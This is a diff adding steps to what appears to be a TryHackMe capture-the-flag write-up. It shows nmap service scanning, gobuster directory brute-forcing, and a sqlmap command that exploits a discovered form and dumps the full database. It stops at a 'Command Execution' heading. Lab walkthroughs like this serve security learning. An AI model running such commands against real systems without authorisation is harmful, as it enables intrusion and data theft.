@@ -5,6 +5,32 @@ categories: [Security, TryHackMe]
 tags: [thm, codcapper, writeup]     # TAG names should always be lowercase
 ---
 
+## Task 2
+> Host Enumeration
+
+```console
+nmap -sV <ip> -v
+```
+
+You will found all the answer with this command.
+
+## Task 3
+> Web Enumeration
+
+```console
+gobuster dir -u <ip> -w /usr/share/wordlists/dirb/big.txt
+```
+
+Analyze the result, a page name may inspired you.
+
+## Task 4
+> Web Exploitation
+
+```console
+sqlmap -u "<url>" --forms --dump -a
+```
+where url is the link to the previous page name discover (http://ip:port/pagename)
+
 ## Task 5
 > Command Execution
 
